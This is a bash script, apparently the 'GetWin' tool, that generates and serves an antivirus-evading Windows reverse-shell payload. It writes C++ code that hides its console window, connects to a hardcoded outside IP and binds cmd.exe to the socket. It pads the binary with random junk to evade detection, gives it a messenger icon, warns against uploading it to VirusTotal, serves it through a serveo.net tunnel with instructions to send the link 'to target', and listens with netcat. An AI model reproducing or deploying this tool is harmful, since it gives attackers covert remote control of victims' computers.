#!/bin/bash
# GetWin v1.2
# FUD Payload Generator and Listener
# Coded by @thelinuxchoice
# Github: https://github.com/thelinuxchoice/getwin

trap 'printf "\n";stop' 2

banner() {


printf "    \e[1;31m _______\e[0m                \e[1;31m_\e[0m  \e[1;32m_\e[0m  \e[1;34m_\e[0m  \e[1;93m_\e[0m         \n"
printf "    \e[1;31m(_______)\e[0m          _   \e[1;31m(_)\e[0m\e[1;32m(_)\e[0m\e[1;34m(_)\e[0m\e[1;93m(_)\e[0m        \n"
printf "    \e[1;77m _   ___  _____  _| |_  _  _  _  _  ____   \n"
printf "    | | (_  || ___ |(_   _)| || || || ||  _ \  \n"
printf "    | |___) || ____|  | |_ | || || || || | | | \n"
printf "     \_____/ |_____)   \__) \_____/ |_||_| |_|v1.2 \e[0m\n"
                                          
printf "\n"
printf "\e[1;77m.:.:\e[0m\e[1;93m FUD win32 payload generator and listener \e[0m\e[1;77m:.:.\e[0m\n"                              
printf "\e[1;93m        .:.:\e[0m\e[1;92m Coded by:\e[0m\e[1;77m@thelinuxchoice\e[0m \e[1;93m:.:.\e[0m\n"
printf "\n"
printf "     \e[101m:: Warning: Attacking targets without  ::\e[0m\n"
printf "     \e[101m:: prior mutual consent is illegal!    ::\e[0m\n"
printf "\n"
}


stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }
command -v i686-w64-mingw32-g++ > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"apt-get install mingw-w64\" .Aborting."; 
exit 1; }
command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
exit 1; }

}
server() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net -R $default_port3:localhost:$default_port2 2> /dev/null &
sleep 3
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the first link above to target + /%s.exe:\e[0m\e[1;77m \n' $payload_name
php -S localhost:$port > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting connection...\e[0m\n'
printf "\n"
nc -lvp $default_port2

}

compile() {

if [[ ! -e program.cpp ]]; then
printf "\e[1;93m[!] Error...\e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
i686-w64-mingw32-windres icon.rc -O coff -o my.res
i686-w64-mingw32-g++ -o $payload_name.exe program.cpp my.res -lws2_32
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.exe\n" $payload_name
printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
rm -rf program.cpp
rm -rf icon.rc
rm -rf my.res
fi

}

icon() {

default_payload_icon="icon/messenger.ico"
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
read payload_icon
payload_icon="${payload_icon:-${default_payload_icon}}"

if [[ ! -e $payload_icon ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
icon
else
if [[ $payload_icon != *.ico ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
icon
fi
fi

}

start() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
icon
payload
compile
server



}

#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> program.cpp
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> program.cpp
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;" >> program.cpp
		else
			echo $randomString >> program.cpp
		fi
	done
        let counter=counter+1
    done
}

payload() {

printf '#define _WINSOCK_DEPRECATED_NO_WARNINGS\n' > program.cpp
printf '#include <winsock2.h>\n' >> program.cpp
printf '#include <stdio.h>\n' >> program.cpp
printf '#pragma comment(lib,"ws2_32")\n' >> program.cpp

generatePadding
generatePadding

printf 'WSADATA wsaData;\n' >> program.cpp
printf 'SOCKET sl;\n' >> program.cpp
printf 'struct sockaddr_in sockcon;\n' >> program.cpp
printf 'STARTUPINFO sui;\n' >> program.cpp
printf 'PROCESS_INFORMATION pi;\n' >> program.cpp
printf 'int main(int argc, char* argv[])\n' >> program.cpp
printf '{\n' >> program.cpp
printf ' ShowWindow (GetConsoleWindow(), SW_HIDE);\n' >> program.cpp
printf ' WSAStartup(MAKEWORD(2,2),&wsaData);\n' >> program.cpp
printf ' sl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);\n' >> program.cpp
printf ' sockcon.sin_family = AF_INET;\n' >> program.cpp
printf ' sockcon.sin_port = htons(%s);\n' $default_port3  >> program.cpp
printf ' sockcon.sin_addr.s_addr = inet_addr("159.89.214.31");\n' >> program.cpp
printf ' WSAConnect(sl, (SOCKADDR*)&sockcon,sizeof(sockcon),NULL,NULL,NULL,NULL);\n' >> program.cpp

printf ' memset(&sui, 0, sizeof(sui));\n' >> program.cpp
printf ' sui.cb = sizeof(sui);\n' >> program.cpp
printf ' sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n' >> program.cpp
printf ' sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;\n' >> program.cpp

printf ' TCHAR commandLine[256] = "cmd.exe";\n' >> program.cpp
printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);\n' >> program.cpp
printf '}\n' >> program.cpp
generatePadding
generatePadding
printf "id ICON \"%s\"" $payload_icon  > icon.rc
}
#banner
dependencies
start
